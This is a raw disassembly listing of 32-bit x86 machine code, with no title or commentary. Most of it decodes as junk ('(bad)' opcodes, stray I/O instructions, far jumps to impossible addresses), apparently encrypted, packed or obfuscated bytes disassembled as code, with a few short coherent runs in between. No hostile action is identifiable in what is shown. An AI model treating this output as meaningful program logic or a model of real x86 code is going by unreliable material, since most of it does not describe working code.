  405a25:	adc    DWORD PTR [edx+0x73],0xab145466
  405a2c:	or     eax,0x2bb2e783
  405a31:	cmp    eax,ebx
  405a33:	adc    DWORD PTR [eax],edx
  405a35:	fisttp QWORD PTR [ebx+eax*2+0x1f2237e1]
  405a3c:	xchg   ebx,eax
  405a3d:	adc    bh,ah
  405a3f:	inc    edx
  405a40:	icebp  
  405a41:	out    0x85,al
  405a43:	mov    ebp,0x7eb62b7b
  405a48:	pushf  
  405a49:	inc    esp
  405a4a:	xlat   BYTE PTR ds:[ebx]
  405a4b:	into   
  405a4c:	sub    bh,dh
  405a4e:	(bad)  
  405a4f:	jmp    0x82ed6c
  405a54:	pop    edi
  405a55:	mov    BYTE PTR [edx-0x34855369],cl
  405a5b:	inc    edx
  405a5c:	out    0x1e,eax
  405a5e:	jbe    0x405ad3
  405a60:	fbstp  TBYTE PTR [esi+ebp*2+0x76]
  405a64:	outs   dx,BYTE PTR ds:[esi]
  405a65:	mov    esi,DWORD PTR [ebp-0x77c3c119]
  405a6b:	cmp    al,0xc0
  405a6d:	ror    esi,cl
  405a6f:	sbb    ch,BYTE PTR [eax+0x20c94ed0]
  405a75:	(bad)  
  405a76:	nop
  405a77:	push   ebx
  405a78:	pop    eax
  405a79:	cld    
  405a7a:	repnz push ecx
  405a7c:	div    DWORD PTR [ebx]
  405a7e:	inc    ebp
  405a7f:	adc    BYTE PTR [ecx+0x5],bh
  405a82:	xor    DWORD PTR [edi+0x38],esi
  405a85:	std    
  405a86:	je     0x405a6f
  405a88:	in     al,dx
  405a89:	push   cs
  405a8a:	push   0x7f417b8
  405a8f:	fs ds stos DWORD PTR es:[edi],eax
  405a92:	fwait
  405a93:	(bad)  
  405a94:	enter  0x65f7,0x70
  405a98:	shr    DWORD PTR [edi],1
  405a9a:	stos   BYTE PTR es:[edi],al
  405a9b:	push   esi
  405a9c:	xchg   ebp,eax
  405a9d:	mov    ds:0x1cc4f90,al
  405aa2:	fsubrp st(4),st
  405aa4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405aa5:	xor    edi,DWORD PTR [ecx]
  405aa7:	and    edx,DWORD PTR [edx+eiz*4]
  405aaa:	or     bh,BYTE PTR [edi+edx*2-0x110ea351]
  405ab1:	gs jp  0x405a98
  405ab4:	(bad)  [esi]
  405ab6:	scas   eax,DWORD PTR es:[edi]
  405ab7:	std    
  405ab8:	push   0x9a96c3c3
  405abd:	mov    ecx,0xf9e42e04
  405ac2:	pushf  
  405ac3:	pop    esp
  405ac4:	in     al,dx
  405ac5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405ac6:	in     al,0xf7
  405ac8:	and    al,0x56
  405aca:	sub    al,0xdf
  405acc:	ret    
  405acd:	jae    0x405b04
  405acf:	and    eax,0xce451396
  405ad4:	jae    0x405a62
  405ad6:	jp     0x405a5b
  405ad8:	jle    0x405a96
  405ada:	dec    ebx
  405adb:	sar    esi,cl
  405add:	aam    0x44
  405adf:	in     al,dx
  405ae0:	adc    ch,ah
  405ae2:	mov    esp,0x5fbdaf9c
  405ae7:	ror    cl,0xf1
  405aea:	out    dx,al
  405aeb:	ret    
  405aec:	mov    dh,0x57
  405aee:	xlat   BYTE PTR ds:[ebx]
  405aef:	mov    ebp,0xbd7cf222
  405af4:	cwde   
  405af5:	aam    0x88
  405af7:	(bad)  
  405af8:	call   DWORD PTR [eax+0x775a865c]
  405afe:	xchg   esi,eax
  405aff:	pop    esp
  405b00:	push   0x52d742f3
  405b05:	sub    ecx,DWORD PTR [edi+ebx*1+0x13]
  405b09:	(bad)  
  405b0a:	fldenv [edi-0x77]
  405b0d:	add    al,0x6a
  405b0f:	mov    ch,0x60
  405b11:	jle    0x405a9d
  405b13:	push   eax
  405b14:	mov    ds:0xdc9233b4,al
  405b19:	cmp    BYTE PTR [ebp-0x4db2e47f],ch
  405b1f:	mov    bh,0xf5
  405b21:	dec    ebp
  405b22:	scas   eax,DWORD PTR es:[edi]
  405b23:	mov    esi,0xc084be9d
  405b28:	cmp    BYTE PTR [esi],0xa8
  405b2b:	je     0x405b29
  405b2d:	mov    eax,0x3726dad1
  405b32:	add    DWORD PTR [ebx],ebp
  405b34:	sahf   
  405b35:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405b36:	popa   
  405b37:	sub    ebp,esi
  405b39:	mov    ecx,0xf5f9b7c0
  405b3e:	aaa    
  405b3f:	fwait
  405b40:	push   edi
  405b41:	in     eax,0x2
  405b43:	leave  
  405b44:	xchg   esp,eax
  405b45:	or     eax,0x6d17be10
  405b4a:	pop    edi
  405b4b:	sbb    BYTE PTR [ebx+0x4b],bh
  405b4e:	mov    eax,ds:0xfa94c842
  405b53:	mov    ds:0x617b186f,al
  405b58:	xor    eax,0x6939492a
  405b5d:	jmp    0xd0ffea49
  405b62:	outs   dx,DWORD PTR ds:[esi]
  405b63:	shr    ah,0xf8
  405b66:	cmp    BYTE PTR [ecx+0x6b7af1b7],dl
  405b6c:	je     0x405ba8
  405b6e:	(bad)  
  405b6f:	dec    edx
  405b70:	data16 and ah,0x64
  405b74:	pop    esp
  405b75:	or     ah,al
  405b77:	xlat   BYTE PTR ds:[ebx]
  405b78:	xchg   edx,eax
  405b79:	adc    eax,0x8b7761d1
  405b7e:	adc    eax,DWORD PTR [eax+0x68]
  405b81:	sub    edx,DWORD PTR [ebx-0x26aaf93a]
  405b87:	inc    esp
  405b88:	call   0xfe30:0x42bc06fa
  405b8f:	xor    al,0x94
  405b91:	out    dx,eax
  405b92:	js     0x405bf2
  405b94:	sahf   
  405b95:	(bad)  
  405b96:	shl    DWORD PTR [ebp+edx*2+0x41431b72],cl
  405b9d:	dec    esp
  405b9e:	test   al,0x2d
  405ba0:	push   esp
  405ba1:	fdiv   QWORD PTR ds:0x93f076d3
  405ba7:	jp     0x405ba9
  405ba9:	das    
  405baa:	add    BYTE PTR [edx],ch
  405bac:	fwait
  405bad:	or     DWORD PTR [ebx+0x10],ecx
  405bb0:	ins    DWORD PTR es:[edi],dx
  405bb1:	mov    esi,0xf5f497b1
  405bb6:	fwait
  405bb7:	xor    ecx,DWORD PTR [ecx+0x23]
  405bba:	enter  0xbcf8,0x3c
  405bbe:	sbb    DWORD PTR [ebx],edx
  405bc0:	mov    ds:0xb161548a,eax
  405bc5:	push   ds
  405bc6:	add    al,0x11
  405bc8:	test   BYTE PTR [edi+0x29],ah
  405bcb:	(bad)  
  405bcc:	dec    ebx
  405bcd:	fs jne 0x405b5e
  405bd0:	cmp    eax,0x73abe62d
  405bd5:	popf   
  405bd6:	stc    
  405bd7:	pop    esi
  405bd8:	xchg   DWORD PTR [ebx],esp
  405bda:	clc    
  405bdb:	shl    BYTE PTR [ebx-0x60156a1f],0x9b
  405be2:	sahf   
  405be3:	add    ecx,eax
  405be5:	sub    DWORD PTR [edi-0xf3ba278],ecx
  405beb:	je     0x405c1d
  405bed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405bee:	(bad)  
  405bef:	in     eax,0x98
  405bf1:	push   0x44a307a1
  405bf6:	enter  0xc2be,0x2e
  405bfa:	mov    esi,0x346979ee
  405bff:	push   ebp
  405c00:	cmc    
  405c01:	add    DWORD PTR [ecx],ebp
  405c03:	sub    al,0x41
  405c05:	int3   
  405c06:	push   ebp
  405c07:	jp     0x405c48
  405c09:	std    
  405c0a:	push   es
  405c0b:	sub    DWORD PTR [ebp+eax*2-0x40],0x67
  405c10:	sbb    bh,BYTE PTR [eax+0x2d57a332]
  405c16:	mov    ds:0xd99b3205,al
  405c1c:	mov    ebx,0xe4fbc39b
  405c21:	nop
  405c22:	mov    cl,0xc5
  405c24:	add    eax,0x3fc7157a
  405c29:	cmp    bh,ah
  405c2b:	mov    bh,0xa
  405c2d:	inc    edi
  405c2e:	jmp    0x405c28
  405c30:	cwde   
  405c31:	or     DWORD PTR [esi+0x7ceef724],esi
  405c37:	imul   esp,DWORD PTR [ecx+0x3a],0x65
  405c3b:	sbb    edx,DWORD PTR ds:0x45d77486
  405c41:	scas   al,BYTE PTR es:[edi]
  405c42:	jns    0x405bcf
  405c44:	popf   
  405c45:	aad    0xa2
  405c47:	ins    BYTE PTR es:[edi],dx
  405c48:	mov    bh,0x7a
  405c4a:	inc    ecx
  405c4b:	lock clc 
  405c4d:	ja     0x405c9f
  405c4f:	and    al,0x75
  405c51:	(bad)  [esi-0x288b7f5c]
  405c57:	sbb    ch,BYTE PTR [esp+edx*2+0x39]
  405c5b:	dec    esp
  405c5c:	adc    al,0x73
  405c5e:	psadbw mm0,QWORD PTR [edi]
  405c61:	xor    DWORD PTR [ecx],ebp
  405c63:	test   eax,0xb1e97f28
  405c68:	sbb    BYTE PTR [ecx+0x2d602efc],al
  405c6e:	shl    ebp,cl
  405c70:	adc    DWORD PTR ds:0x3bf765c0,esp
  405c76:	push   eax
  405c77:	cmp    esi,ebp
  405c79:	jno    0x405c76
  405c7b:	cli    
  405c7c:	or     ebx,DWORD PTR [ecx]
  405c7e:	clc    
  405c7f:	in     eax,dx
  405c80:	test   al,0x11
  405c82:	xlat   BYTE PTR ds:[ebx]
  405c83:	mov    al,BYTE PTR [esi]
  405c85:	cli    
  405c86:	fst    QWORD PTR [edi+0x38]
  405c89:	push   ebp
  405c8a:	fbld   TBYTE PTR [edi-0x5e8baf3a]
  405c90:	push   cs
  405c91:	iret   
  405c92:	pop    eax
  405c93:	adc    esp,DWORD PTR [ebx+0x43bc81cd]
  405c99:	popa   
  405c9a:	aas    
  405c9b:	pop    esp
  405c9c:	ds (bad) 
  405c9e:	rol    esp,1
  405ca0:	(bad)  
  405ca2:	push   0x18900acb
  405ca7:	int3   
  405ca8:	xchg   edx,eax
  405ca9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405caa:	retf   
  405cab:	scas   al,BYTE PTR es:[edi]
  405cac:	adc    BYTE PTR [ebp+0x49],al
  405caf:	out    0x18,al
  405cb1:	xchg   BYTE PTR [ecx+esi*8],ch
  405cb4:	sub    ecx,esp
  405cb6:	dec    ecx
  405cb7:	test   eax,0x5bf79af
  405cbc:	xor    eax,0xf43898fb
  405cc1:	loopne 0x405cf1
  405cc3:	ficom  WORD PTR [ebx-0x3574aba3]
  405cc9:	xor    al,0x18
  405ccb:	add    DWORD PTR [esi-0x3f],esi
  405cce:	daa    
  405ccf:	imul   eax,DWORD PTR [ebx],0xfc7a9a2a
  405cd5:	push   es
  405cd6:	jne    0x405d28
  405cd8:	gs pop ebx
  405cda:	cwde   
  405cdb:	or     DWORD PTR [eax+0x6d],esp
  405cde:	sbb    eax,0x38202eb7
  405ce3:	mov    edx,0x2c36c9a3
  405ce8:	mov    eax,0xa75f5709
  405ced:	adc    esp,DWORD PTR [edx-0x39]
  405cf0:	and    eax,0xf4bb8abd
  405cf5:	pop    esi
  405cf6:	loop   0x405ccc
  405cf8:	stos   DWORD PTR es:[edi],eax
  405cf9:	mov    edx,DWORD PTR [ebp-0x34]
  405cfc:	jmp    0x4063dc
  405d01:	mov    edx,DWORD PTR [ebp-0x3c]
  405d04:	mov    edi,DWORD PTR [ebp-0x4]
  405d07:	xor    edx,eax
  405d09:	xor    edi,eax
  405d0b:	add    edx,ecx
  405d0d:	add    edi,ecx
  405d0f:	imul   edx,edi
  405d12:	mov    edi,DWORD PTR [ebp-0x8]
  405d15:	mov    ebx,DWORD PTR [ebp-0x10]
  405d18:	sub    ebx,edi
  405d1a:	jmp    0x406074
  405d1f:	jmp    0xd15f6e3f
  405d24:	xor    eax,0xe321e9f1
  405d29:	les    ecx,FWORD PTR [edi]
  405d2b:	cdq    
  405d2c:	loopne 0x405d7f
  405d2e:	shr    DWORD PTR [edi],cl
  405d30:	ds jle 0x405db1
  405d33:	xor    edi,DWORD PTR [ebp+0x7e]
  405d36:	jle    0x405cdc
  405d38:	imul   dh
  405d3a:	sti    
  405d3b:	dec    esi
  405d3c:	push   ebx
  405d3d:	arpl   WORD PTR [ebx-0x3695b5a4],dx
  405d43:	push   ecx
  405d44:	push   eax
  405d45:	jge    0x405d70
  405d47:	(bad)  
  405d48:	fisub  DWORD PTR [esi+0x642842ff]
  405d4e:	iret   
  405d4f:	nop
  405d50:	mov    edi,0xee0c1c5d
  405d55:	sub    eax,DWORD PTR [ecx]
  405d57:	fbld   TBYTE PTR [eax]
  405d59:	jp     0x405ced
  405d5b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405d5c:	add    DWORD PTR ds:0xfee623cd,esi
  405d62:	lock pushf 
  405d64:	repnz lods al,BYTE PTR ds:[esi]
  405d66:	js     0x405d32
  405d68:	xor    BYTE PTR [edx+0x3f],0x29
  405d6c:	push   0xbe88c40
  405d71:	ja     0x405dd5
  405d73:	les    esi,FWORD PTR [ebx-0x1e]
  405d76:	cwde   
  405d77:	out    dx,al
  405d78:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405d79:	fldenv [edx]
  405d7b:	fstp   QWORD PTR [edi-0x36]
  405d7e:	in     al,0xa7
  405d80:	les    ecx,FWORD PTR [ebx+0x26]
  405d83:	lods   al,BYTE PTR ds:[esi]
  405d84:	sahf   
  405d85:	jp     0x405dbb
  405d87:	in     eax,0x8f
  405d89:	cmp    BYTE PTR [esi+0x30],bh
  405d8c:	xchg   ebx,eax
  405d8d:	sbb    DWORD PTR [esi+0x52],eax
  405d90:	sbb    dh,BYTE PTR [ebx-0x6]
  405d93:	jnp    0x405d7f
  405d95:	ins    BYTE PTR es:[edi],dx
  405d96:	nop
  405d97:	scas   al,BYTE PTR es:[edi]
  405d98:	push   edi
  405d99:	aas    
  405d9a:	add    ebp,DWORD PTR [eax]
  405d9c:	test   DWORD PTR ds:0x5999f777,ebp
  405da2:	inc    esp
  405da3:	cdq    
  405da4:	mov    edx,0xf32c1bf4
  405da9:	adc    BYTE PTR [ebp+0x5382e06a],dl
  405daf:	xchg   ebp,eax
  405db0:	out    dx,al
  405db1:	or     ecx,DWORD PTR [eax-0x16e0355b]
  405db7:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  405db9:	dec    edx
  405dba:	mov    ebx,0xee686d8b
  405dbf:	lea    esp,[edx]
  405dc1:	pop    ebp
  405dc2:	call   0x6177:0xbfdf4c16
  405dc9:	lea    edx,[esi-0x5ec65f]
  405dcf:	ins    DWORD PTR es:[edi],dx
  405dd0:	pop    ss
  405dd1:	mov    cl,0x48
  405dd3:	cmp    al,ah
  405dd5:	mov    esi,0x9e6933b1
  405dda:	push   0x28a835d0
  405ddf:	xchg   edx,eax
  405de0:	or     cl,ah
  405de2:	pop    eax
  405de3:	hlt    
  405de4:	or     dl,al
  405de6:	clc    
  405de7:	push   es
  405de8:	stos   BYTE PTR es:[edi],al
  405de9:	jno    0x405d98
  405deb:	repz fsubr QWORD PTR [ebx+0x25]
  405def:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405df0:	outs   dx,BYTE PTR ds:[esi]
  405df1:	out    dx,al
  405df2:	and    BYTE PTR [edi+eax*4-0x2f],cl
  405df6:	sti    
  405df7:	popa   
  405df8:	stos   DWORD PTR es:[edi],eax
  405df9:	stc    
  405dfa:	xor    edx,edi
  405dfc:	mov    cl,0x65
  405dfe:	dec    ebx
  405dff:	jnp    0x405e3e
  405e01:	xchg   edi,eax
  405e02:	popf   
  405e03:	mov    eax,ds:0x1faa7854
  405e08:	int3   
  405e09:	xchg   al,dh
  405e0b:	pop    ebp
  405e0c:	shr    WORD PTR es:[eax],1
  405e10:	scas   eax,DWORD PTR es:[edi]
  405e11:	jno    0x405e1e
  405e13:	push   cs
  405e14:	mov    cl,0x30
  405e16:	fs mov dh,0x32
  405e19:	test   DWORD PTR [edx+edx*1+0x55],edi
  405e1d:	jge    0x405de0
  405e1f:	popf   
  405e20:	int3   
  405e21:	xor    al,BYTE PTR [eax]
  405e23:	sahf   
  405e24:	fcmovnu st,st(1)
  405e26:	test   BYTE PTR [edi],bl
  405e28:	mov    ch,0xd5
  405e2a:	jmp    FWORD PTR [edi+0x645d2fea]
  405e30:	sub    eax,0x3ddb5487
  405e35:	xor    BYTE PTR [esi+0x6b16da88],0xc5
  405e3c:	adc    al,0x10
  405e3e:	xlat   BYTE PTR ds:[ebx]
  405e3f:	sub    ecx,edx
  405e41:	dec    ch
  405e43:	or     al,BYTE PTR [esi]
  405e45:	cmc    
  405e46:	and    bl,BYTE PTR [esp+eiz*2-0x795f986b]
  405e4d:	lods   eax,DWORD PTR ds:[esi]
  405e4e:	inc    edi
  405e4f:	dec    edi
  405e50:	arpl   WORD PTR [edx],bx
  405e52:	mov    eax,0x7182b42a
  405e57:	call   0x6ae8be95
  405e5c:	outs   dx,BYTE PTR ds:[esi]
  405e5d:	push   ebx
  405e5e:	daa    
  405e5f:	mov    eax,ds:0x453a6492
  405e64:	fs popf 
  405e66:	in     al,dx
  405e67:	mov    edx,0xe28dc0c5
  405e6c:	scas   eax,DWORD PTR es:[edi]
  405e6d:	ds push eax
  405e6f:	outs   dx,BYTE PTR ds:[esi]
  405e70:	outs   dx,BYTE PTR ds:[esi]
  405e71:	dec    esp
  405e72:	retf   0x9463
  405e75:	add    edi,DWORD PTR [ecx-0xb]
  405e78:	mov    edx,ebx
  405e7a:	jp     0x405ece
  405e7c:	mov    cl,0xf2
  405e7e:	inc    ecx
  405e7f:	adc    esp,DWORD PTR [edx]
  405e81:	sar    DWORD PTR [ecx],cl
  405e83:	sbb    ch,BYTE PTR [ebx+0x547ced76]
  405e89:	pop    edi
  405e8a:	mov    bh,0x25
  405e8c:	(bad)  
  405e8d:	repz and ebp,ecx
  405e90:	xor    ecx,0xffffffe5
  405e93:	iret   
  405e94:	aaa    
  405e95:	pushf  
  405e96:	pop    es
  405e97:	or     al,0xba
  405e99:	fcom   st(6)
  405e9b:	or     ebx,edx
  405e9d:	mov    ds:0x9cc50a12,al
  405ea2:	pop    ds
  405ea3:	cli    
  405ea4:	inc    ebx
  405ea5:	or     al,0x5f
  405ea7:	dec    esi
  405ea8:	dec    edx
  405ea9:	mov    ch,0x4f
  405eab:	repnz sub ah,al
  405eae:	inc    edi
  405eaf:	add    al,0x26
  405eb1:	popf   
  405eb2:	pop    esp
  405eb3:	retf   0xe5c6
  405eb6:	and    DWORD PTR [edi+edx*2],ebx
  405eb9:	adc    al,0x5
  405ebb:	add    BYTE PTR [eax],bl
  405ebd:	jmp    FWORD PTR [edi]
  405ebf:	lea    edi,[edi-0x484cbfff]
  405ec5:	jne    0x405e9c
  405ec7:	in     eax,dx
  405ec8:	sti    
  405ec9:	sub    BYTE PTR [esi],al
  405ecb:	xlat   BYTE PTR ds:[ebx]
  405ecc:	add    ch,ah
  405ece:	stc    
  405ecf:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  405ed1:	retf   
  405ed2:	mov    eax,ss
  405ed4:	clc    
  405ed5:	mov    bh,0xfb
  405ed7:	idiv   BYTE PTR [ebx]
  405ed9:	ins    DWORD PTR es:[edi],dx
  405eda:	fs push ebx
  405edc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405edd:	das    
  405ede:	les    edx,FWORD PTR [eax-0x16f8332f]
  405ee4:	sbb    BYTE PTR [eax+0xb3be489],0xd3
  405eeb:	add    ah,BYTE PTR [ebp+0x6853b944]
  405ef1:	ins    DWORD PTR es:[edi],dx
  405ef2:	xchg   edx,eax
  405ef3:	into   
  405ef4:	cld    
  405ef5:	xlat   BYTE PTR ds:[ebx]
  405ef6:	push   ecx
  405ef7:	inc    eax
  405ef8:	and    bl,bh
  405efa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405efb:	or     bl,dl
  405efd:	fidiv  WORD PTR [esi]
  405eff:	cmp    eax,0x3821e998
  405f04:	sbb    DWORD PTR [edx],edx
  405f06:	imul   esp,DWORD PTR [edx],0xa2b05c02
  405f0c:	or     esi,eax
  405f0e:	inc    eax
  405f0f:	repz into 
  405f11:	jne    0x405e99
  405f13:	mov    edx,0x47ea066
  405f18:	mov    edx,0x47103bd5
  405f1d:	or     BYTE PTR [ebp+0x9],ch
  405f20:	adc    BYTE PTR [edi-0x7682a663],al
  405f26:	outs   dx,DWORD PTR ds:[esi]
  405f27:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405f28:	push   edi
  405f29:	loopne 0x405ecd
  405f2b:	sbb    ebx,DWORD PTR [edi+0x16]
  405f2e:	add    al,0x5
  405f30:	pop    es
  405f31:	pop    edi
  405f32:	mov    cl,0x27
  405f34:	and    cl,BYTE PTR [ebx+0x76]
  405f37:	ja     0x405fb0
  405f39:	xor    ecx,ecx
  405f3b:	ins    DWORD PTR es:[edi],dx
  405f3c:	mov    ah,0x9d
  405f3e:	dec    ecx
  405f3f:	mov    ecx,0xe389aee2
  405f44:	cmp    esi,ebp
  405f46:	jge    0x405f7a
  405f48:	(bad)  
  405f4a:	daa    
  405f4b:	adc    al,al
  405f4d:	repnz out 0xdc,eax
  405f50:	popf   
  405f51:	nop
  405f52:	imul   ebx,DWORD PTR [ebp+0x62],0x69f46953
  405f59:	ret    
  405f5a:	push   ebx
  405f5b:	retf   0x2645
  405f5e:	add    al,0x50
  405f60:	pop    edi
  405f61:	jge    0x405f1b
  405f63:	mov    WORD PTR [ebx-0x3f38f66a],?
  405f69:	sti    
  405f6a:	mov    bl,BYTE PTR [ecx]
  405f6c:	xchg   DWORD PTR [edx+0x40],edx
  405f6f:	(bad)  
  405f70:	fistp  WORD PTR [ecx-0x7b]
  405f73:	ret    
  405f74:	sar    al,1
  405f76:	rcr    DWORD PTR [ecx-0x74617179],cl
  405f7c:	push   0x1759e709
  405f81:	jecxz  0x405fa2
  405f83:	cmp    bl,BYTE PTR [esi+0x282a7f51]
  405f89:	rcr    DWORD PTR [esi],0x7
  405f8c:	xor    ch,ch
  405f8e:	fnstsw WORD PTR [edx+0x757a597b]
  405f94:	dec    eax
  405f95:	aaa    
  405f96:	shl    DWORD PTR [esi+0x31],0xe2
  405f9a:	sub    BYTE PTR [edi+edi*2+0x26068b51],al
  405fa1:	xchg   edx,eax
  405fa2:	jl     0x405f62
  405fa4:	push   esp
  405fa5:	test   BYTE PTR [ecx+0x2],bh
  405fa8:	daa    
  405fa9:	fwait
  405faa:	aad    0x2
  405fac:	(bad)  
  405fad:	mov    bh,0x89
  405faf:	gs icebp 
  405fb1:	mov    bl,0xff
  405fb3:	or     eax,0x9b77ac70
  405fb8:	xor    ch,bh
  405fba:	sub    bh,BYTE PTR [ebp+0x359d9307]
  405fc0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405fc1:	aas    
  405fc2:	mov    eax,ds:0x30faff2a
  405fc7:	fist   WORD PTR [esi+0xe]
  405fca:	adc    BYTE PTR [edx],dl
  405fcc:	mov    eax,ds:0x5aa42da2
  405fd1:	jmp    0xdcbeab17
  405fd6:	jmp    0xbb51:0x981c370d
  405fdd:	mov    al,ds:0xb72d8084
  405fe2:	(bad)  [eax+0x2c]
  405fe5:	sbb    dl,ah
  405fe7:	pushf  
  405fe8:	stos   BYTE PTR es:[edi],al
  405fe9:	xchg   DWORD PTR [ebp+0x37b1dcf0],esp
  405fef:	js     0x405ff6
  405ff1:	inc    ebx
  405ff2:	ja     0x40605c
  405ff4:	pop    ebp
  405ff5:	out    0x81,eax
  405ff7:	or     al,0xe2
  405ff9:	jne    0x406044
  405ffb:	in     eax,dx
  405ffc:	push   edx
  405ffd:	stos   BYTE PTR es:[edi],al
  405ffe:	inc    ecx
  405fff:	add    dl,BYTE PTR [edi]
  406001:	and    al,0x41
  406003:	les    eax,FWORD PTR [eax]
  406005:	or     DWORD PTR [ecx],edi
  406007:	out    dx,eax
  406008:	in     al,dx
  406009:	enter  0x7b39,0x70
  40600d:	mov    ds:0xd648a63b,eax
  406012:	loopne 0x405fc4
  406014:	aas    
  406015:	icebp  
  406016:	or     dl,BYTE PTR ds:0x48e711a7
  40601c:	cld    
  40601d:	add    al,0x5
  40601f:	in     al,dx
  406020:	daa    
  406021:	mov    cl,BYTE PTR [eax-0x1b5e9687]
  406027:	jo     0x40601d
  406029:	imul   edi,DWORD PTR [eax],0xffffffa0
  40602c:	jbe    0x40607c
  40602e:	cld    
  40602f:	push   edx
  406030:	push   cs
  406031:	int    0xcc
  406033:	iret   
  406034:	in     eax,0x53
  406036:	call   0xfe4497a6
  40603b:	fs or  al,0xab
  40603e:	pop    es
  40603f:	mov    ebp,0x4186b31c
  406044:	mov    esi,esi
  406046:	sbb    dh,BYTE PTR [eax+0x44d83b3a]
  40604c:	push   cs
  40604d:	pop    es
  40604e:	dec    ebp
  40604f:	mov    ebx,0x7e32469c
  406054:	mov    bl,0x67
  406056:	lahf   
  406057:	sahf   
  406058:	mov    esi,ebp
  40605a:	sbb    BYTE PTR [edx-0x18a9ea54],0x95
  406061:	fidivr DWORD PTR [esi]
  406063:	enter  0xd8a2,0x91
  406067:	mov    bl,0x28
  406069:	(bad)  
  40606a:	in     eax,0x53
  40606c:	fdivrp st(4),st
  40606e:	add    cl,BYTE PTR [ebx+eax*4+0x1a]
  406072:	xor    esi,ebx
  406074:	cmp    ebx,edx
  406076:	mov    edx,DWORD PTR [ebp-0x38]
  406079:	jmp    0x4063d3
  40607e:	test   eax,0x68f06eef
  406083:	jno    0x406036
  406085:	ja     0x406061
  406087:	shr    BYTE PTR [edx+0x79],0x2a
  40608b:	stos   DWORD PTR es:[edi],eax
  40608c:	aam    0x8c
  40608e:	loopne 0x4060cd
  406090:	jle    0x406110
  406092:	xor    edi,DWORD PTR [ebp+0x7e]
  406095:	jle    0x406091
  406097:	shr    DWORD PTR [ebx+0x4373626a],0xef
  40609e:	xchg   ecx,eax
  40609f:	lods   al,BYTE PTR ds:[esi]
  4060a0:	dec    eax
  4060a1:	es mov ss,ebx
  4060a4:	call   0xa1b4fe5a
  4060a9:	fucomp st(1)
  4060ab:	mov    ecx,DWORD PTR [edi-0x32]
  4060ae:	pop    edx
  4060af:	int    0x35
  4060b1:	pushf  
  4060b2:	shl    edi,0x15
  4060b5:	mov    ebx,ecx
  4060b7:	stos   DWORD PTR es:[edi],eax
  4060b8:	sti    
  4060b9:	mov    al,ds:0x898d20ba
  4060be:	stos   DWORD PTR es:[edi],eax
  4060bf:	rcr    edi,0xbc
  4060c2:	hlt    
  4060c3:	es nop
  4060c5:	ja     0x406054
  4060c7:	xlat   BYTE PTR fs:[ebx]
  4060c9:	jge    0x406053
  4060cb:	loop   0x4060de
  4060cd:	(bad)  
  4060ce:	in     al,dx
  4060cf:	fwait
  4060d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4060d1:	clc    
  4060d2:	mov    edi,0x5a2efac3
  4060d7:	in     al,dx
  4060d8:	call   0x6be78a82
  4060dd:	sub    bl,al
  4060df:	(bad)  
  4060e0:	rcr    BYTE PTR [eax-0x44],cl
  4060e3:	aam    0x9e
  4060e5:	ja     0x40611c
  4060e7:	call   0xa4921510
  4060ec:	xchg   ebp,eax
  4060ed:	jmp    0x6599:0x44e27a73
  4060f4:	mov    ds:0x34cdbfe3,al
  4060f9:	pop    esp
  4060fa:	(bad)  
  4060fb:	jo     0x40616f
  4060fd:	inc    esp
  4060fe:	leave  
  4060ff:	and    DWORD PTR [ecx-0x7a34aa50],ecx
  406105:	pop    eax
  406106:	cwde   
  406107:	add    DWORD PTR [esi],ebx
  406109:	or     BYTE PTR [esi+0x49],0x3a
  40610d:	push   edi
  40610e:	jmp    0xf710b80
  406113:	xchg   esp,eax
  406114:	sub    ch,BYTE PTR ds:0x48bb209f
  40611a:	stos   BYTE PTR es:[edi],al
  40611b:	xchg   esp,eax
  40611c:	xchg   edi,eax
  40611d:	pop    ebx
  40611e:	xchg   edi,eax
  40611f:	jmp    0xe0837c28
  406124:	dec    edi
  406125:	adc    DWORD PTR [edx+0x3f],ebp
  406128:	push   ss
  406129:	mov    dl,0xaf
  40612b:	ficom  DWORD PTR [ecx+0x3ad3ef8c]
  406131:	or     DWORD PTR [edi+0x2a],ecx
  406134:	add    bh,BYTE PTR [ebp-0x2f]
  406137:	push   0xbdca5b8c
  40613c:	mov    ecx,0xc3b2abe1
  406141:	addr16 add al,ah
  406144:	les    edx,FWORD PTR [edi+0x7de45f7]
  40614a:	xchg   ebx,eax
  40614b:	sub    DWORD PTR [ecx+0x6d3ea58c],ebx
  406151:	aam    0x89
  406153:	rol    BYTE PTR ds:0xb45b8b54,cl
  406159:	imul   BYTE PTR [ebx]
  40615b:	cmp    BYTE PTR [eax+0x71],ch
  40615e:	nop
  40615f:	ds cmp eax,0xbe95d48
  406165:	cmpxchg BYTE PTR [esi-0x345d2d73],bl
  40616c:	mov    ch,0x7c
  40616e:	jmp    0x5114be2
  406173:	inc    ebx
  406174:	fsubr  QWORD PTR [edi+edx*2-0x6b]
  406178:	xchg   ebp,eax
  406179:	ins    BYTE PTR es:[edi],dx
  40617a:	nop
  40617b:	jno    0x40611d
  40617d:	(bad)  
  40617e:	cdq    
  40617f:	jp     0x40619b
  406181:	or     ch,BYTE PTR [ebx+0x326abdea]
  406187:	xchg   esp,eax
  406188:	push   esp
  406189:	dec    esp
  40618a:	dec    ebp
  40618b:	clc    
  40618c:	pusha  
  40618d:	mov    WORD PTR [ebp+0x66],?
  406190:	mov    ds:0x9f1414c0,eax
  406195:	sbb    ch,dh
  406197:	push   ds
  406198:	adc    eax,0xf215bf22
  40619d:	add    BYTE PTR [edx-0x11],0x5b
  4061a1:	(bad)  
  4061a2:	std    
  4061a3:	test   BYTE PTR [edx+0x7b],ch
  4061a6:	inc    eax
  4061a7:	adc    DWORD PTR [ebx],edx
  4061a9:	push   ss
  4061aa:	xor    eax,0x9ca96769
